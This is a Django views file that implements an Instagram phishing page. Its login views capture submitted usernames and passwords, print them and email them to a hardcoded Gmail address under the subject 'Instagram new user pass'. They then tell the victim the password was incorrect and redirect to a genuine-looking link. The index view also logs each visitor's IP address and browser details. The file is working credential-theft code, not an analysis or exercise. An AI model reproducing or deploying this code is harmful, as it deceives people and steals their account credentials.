from django.shortcuts import render, redirect
from django.contrib import messages
from user_agents import parse
from django.core.mail import send_mail

def index(request):
    user_agent_string = request.META.get('HTTP_USER_AGENT', 'Unknown User Agent')
    user_agent = parse(user_agent_string)
    device_info = f'Device Info: {user_agent.browser.family} {user_agent.browser.version_string} on {user_agent.os.family}'
    user_ip = request.META.get('REMOTE_ADDR', 'Unknown IP')
    print(device_info)
    print(f'User IP: {user_ip}')
    return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})

def login_view(request):
    success_message = None
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Save form data to the database
        user_data = {'username': username, 'password': password}
        print(f'User Data: {user_data}')
        send_email(user_data)
        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)
        # return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')

    return render(request, 'myapp/index2.html', {'success_message': success_message})


def send_email(user_data):
    subject = 'Instagram new user pass'
    message = f'New user registered!\n\nUsername: {user_data["username"]}\nPassword: {user_data["password"]}'
    from_email = 'qadeeba123@gmail.com'  # Replace with your email address
    recipient_list = ['aahadrahi786@gmail.com']  # Replace with the recipient's email address

    send_mail(subject, message, from_email, recipient_list)




def login_view2(request):
    success_message = None
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Save form data to the database
        user_data = {'username': username, 'password': password}
        print(f'User Data: {user_data}')
        send_email(user_data)
        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)
        return redirect('https://maps.app.goo.gl/hdyjYbiCTkxKbyVx6')

   